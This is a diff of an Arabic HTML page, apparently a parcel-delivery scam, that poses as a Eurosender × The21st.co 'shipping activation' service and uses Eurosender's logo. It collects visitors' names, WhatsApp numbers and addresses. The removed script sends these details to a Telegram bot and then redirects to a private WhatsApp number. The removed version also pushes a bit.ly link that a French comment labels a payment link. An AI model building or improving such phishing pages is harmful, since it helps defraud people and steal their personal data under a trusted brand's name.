@@ -3,111 +3,95 @@
 <head>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1"/>
-  <title>Eurosender × The21st.co — تفعيل</title>
-  <style>
-    body{font-family:system-ui;background:#0b0f14;color:#e5e7eb;margin:0;padding:24px}
-    .card{max-width:520px;margin:auto;background:#111827;border:1px solid #ffffff14;border-radius:14px;padding:18px}
-    label{display:block;margin:10px 0 6px;color:#cbd5e1}
-    input,select{width:100%;padding:12px;border-radius:10px;border:1px solid #ffffff22;background:#0f1623;color:#e5e7eb}
-    button,a.btn{display:inline-block;margin-top:14px;padding:12px 16px;border-radius:10px;border:none;background:#22c55e;color:#052e1a;font-weight:700;text-decoration:none}
-    .muted{color:#9ca3af;font-size:12px;margin-top:6px}
-    .ok,.err{display:none;margin-top:10px;padding:10px;border-radius:8px}
-    .ok{background:#052e1a;color:#d1fae5}.err{background:#3b0a0a;color:#fecaca}
-    .actions{display:flex;gap:10px;flex-wrap:wrap}
-  </style>
+  <title>Eurosender × The21st.co — تفعيل الشحن</title>
+  <meta name="description" content="تأكيد بيانات التوصيل وتفعيل الشحن عبر Eurosender × The21st.co">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="style.css"/>
 </head>
 <body>
-  <div class="card">
-    <h2>Eurosender × The21st.co</h2>
-    <p>يرجى تأكيد البيانات ثم الضغط على زر <b>إرسال إلى البوت</b>. بعد الإرسال سيتم فتح واتساب تلقائيًا للتأكيد.</p>
+  <div class="page">
+    <header class="topbar">
+      <div class="brand">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/58/Eurosender_logo.svg/320px-Eurosender_logo.svg.png" alt="Eurosender"
+             onerror="this.src='https://dummyimage.com/80x28/111827/ffffff.png&text=Eurosender'">
+        <span class="x">×</span>
+        <img class="logo2" src="https://the21st.co/logo.png" alt="The21st.co"
+             onerror="this.src='https://dummyimage.com/86x28/111827/ffffff.png&text=The21st.co'">
+      </div>
+      <div class="meta">
+        <div class="title">تفعيل الشحن</div>
+        <div class="subtitle">خدمة لوجستية بالتعاون مع Eurosender و The21st.co</div>
+      </div>
+    </header>
 
-    <label>الاسم الكامل</label>
-    <input id="fullName" placeholder="مثال: محمد بن علي" required>
+    <main class="shell">
+      <section class="card">
+        <h1>تأكيد بيانات التوصيل</h1>
+        <p class="lead">يرجى إدخال البيانات بدقة. بعد الإرسال سنحوّلكم تلقائيًا إلى الصفحة التالية لإتمام المتابعة.</p>
 
-    <label>رقم الجوال (واتساب)</label>
-    <input id="phone" placeholder="9665XXXXXXXX" required>
+        <form id="activation-form" novalidate>
+          <div class="grid two">
+            <div class="field">
+              <label for="fullName">الاسم الكامل</label>
+              <input id="fullName" name="fullName" placeholder="مثال: محمد بن علي" required>
+            </div>
+            <div class="field">
+              <label for="phone">رقم الجوال (واتساب)</label>
+              <input id="phone" name="phone" class="ltr" inputmode="tel" placeholder="9665XXXXXXXX" required>
+              <div class="hint">أدخل الرقم مع مفتاح الدولة.</div>
+            </div>
+          </div>
 
-    <label>طريقة التوصيل</label>
-    <select id="delivery" required>
-      <option value="">— اختر الخيار —</option>
-      <option>التوصيل العادي</option>
-      <option>التوصيل السريع</option>
-      <option>التوصيل المميز مع التأمين</option>
-    </select>
+          <div class="grid two">
+            <div class="field">
+              <label for="country">الدولة</label>
+              <select id="country" name="country" required>
+                <option value="">— اختر الدولة —</option>
+                <option>المملكة العربية السعودية</option>
+                <option>الإمارات العربية المتحدة</option>
+                <option>قطر</option>
+                <option>الكويت</option>
+                <option>البحرين</option>
+                <option>عُمان</option>
+                <option>الأردن</option>
+                <option>بلد آخر</option>
+              </select>
+            </div>
+            <div class="field">
+              <label for="city">المدينة</label>
+              <input id="city" name="city" placeholder="الرياض" required>
+            </div>
+          </div>
 
-    <div class="actions">
-      <button id="sendToBotBtn" type="button">إرسال إلى البوت</button>
+          <div class="field">
+            <label for="delivery">طريقة التوصيل المفضلة</label>
+            <select id="delivery" name="delivery" required>
+              <option value="">— اختر الخيار —</option>
+              <option>التوصيل العادي</option>
+              <option>التوصيل السريع</option>
+              <option>التوصيل المميز مع التأمين</option>
+            </select>
+          </div>
 
-      <!-- Lien de paiement (Jotform/bitly) -->
-      <a class="btn" id="payLink" href="https://bit.ly/4muKMRL" target="_blank" rel="noopener">
-        متابعة التفعيل عبر الرابط الآمن
-      </a>
+          <div class="field">
+            <label for="notes">ملاحظات (اختياري)</label>
+            <input id="notes" name="notes" placeholder="تعليمات خاصة بالتسليم إن وجدت">
+          </div>
 
-      <!-- Lien WhatsApp manuel (en plus de l’ouverture auto) -->
-      <a class="btn" style="background:#38bdf8;color:#0b0f14"
-         href="https://wa.me/447412807758?text=%D8%AA%D9%85%20%D8%AA%D8%B9%D8%A8%D8%A6%D8%A9%20%D8%A7%D9%84%D9%86%D9%85%D9%88%D8%B0%D8%AC%20%D9%88%D8%A5%D8%B1%D8%B3%D8%A7%D9%84%D9%87%20%D8%A5%D9%84%D9%89%20%D8%A7%D9%84%D8%A8%D9%88%D8%AA"
-         target="_blank" rel="noopener">
-        العودة لتأكيد واتساب
-      </a>
-    </div>
+          <button id="submitBtn" class="btn" type="submit">متابعة التفعيل</button>
 
-    <div id="ok"  class="ok">✅ تم الإرسال إلى البوت، سيتم فتح واتساب الآن للتأكيد…</div>
-    <div id="err" class="err">❌ تعذّر الإرسال، حاول لاحقًا.</div>
+          <div id="ok"  class="alert ok"  role="status">✅ تم إرسال البيانات، جاري تحويلكم…</div>
+          <div id="err" class="alert err" role="alert">❌ تعذّر الإرسال. يرجى المحاولة لاحقًا.</div>
+        </form>
 
-    <p class="muted">ملاحظة: لا يتم جمع بيانات حساسة هنا. بعد إتمام الرابط الآمن يرجى تأكيد العملية عبر واتساب.</p>
+        <div class="fineprint">بالإرسال، توافق على مشاركة بيانات التوصيل مع مزوّد الخدمة اللوجستية لغرض الشحن فقط.</div>
+      </section>
+    </main>
+
+    <footer class="footer">© <span id="year"></span> The21st.co — جميع الحقوق محفوظة.</footer>
   </div>
 
-  <script>
-    // (1) normaliser chiffres arabes/iraniens -> 0-9
-    function normalizeDigits(str=''){
-      const map={'٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9','۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9'};
-      return (str+'').replace(/[٠-٩۰-۹]/g, d => map[d] || d);
-    }
-    // (2) message HTML pour Telegram
-    function toTelegramHTML(d){
-      const esc = s => String(s||'').replace(/[<&>]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
-      return (
-        `<b>طلب تفعيل الشحن</b>\n`+
-        `— — — — — — — — —\n`+
-        `<b>الاسم:</b> ${esc(d.fullName)}\n`+
-        `<b>الجوال:</b> ${esc(normalizeDigits(d.phone))}\n`+
-        `<b>طريقة التوصيل:</b> ${esc(d.delivery)}\n`+
-        `— — — — — — — — —\n<i>Eurosender × The21st.co</i>`
-      );
-    }
-    // (3) ouverture WhatsApp (auto) — tu peux basculer sur ton lien "message" si tu préfères
-    function openWhatsAppAuto(){
-      // Option A (préremplie - recommandé) :
-      const waNumber = '447412807758'; // ton numéro sans +
-      const message  = 'تم الإرسال إلى البوت، يرجى تأكيد التفعيل. شكراً.';
-      const urlA = `https://wa.me/${waNumber}?text=${encodeURIComponent(message)}`;
-
-      // Option B (ton lien direct Business, sans message prérempli) :
-      // const urlB = 'https://wa.me/message/I77OHUE4I7XSF1';
-
-      window.location.href = urlA; // -> mets urlB si tu préfères.
-    }
-
-    // (4) clic du bouton : POST -> /api/submit (Vercel) puis ouverture WhatsApp
-    document.getElementById('sendToBotBtn').addEventListener('click', async ()=>{
-      const ok=document.getElementById('ok'), err=document.getElementById('err');
-      ok.style.display='none'; err.style.display='none';
-      const data = {
-        fullName: document.getElementById('fullName').value.trim(),
-        phone:    document.getElementById('phone').value.trim(),
-        delivery: document.getElementById('delivery').value.trim(),
-      };
-      if(!data.fullName || !data.phone || !data.delivery){ err.style.display='block'; return; }
-      try{
-        const res = await fetch('/api/submit', {
-          method:'POST', headers:{'Content-Type':'application/json'},
-          body: JSON.stringify({ payload: toTelegramHTML(data) })
-        });
-        if(!res.ok) throw new Error('bad');
-        ok.style.display='block';
-        setTimeout(openWhatsAppAuto, 500); // ouvre WhatsApp après 0,5s
-      }catch(e){ err.style.display='block'; }
-    });
-  </script>
+  <script src="send.js"></script>
 </body>
 </html>
+
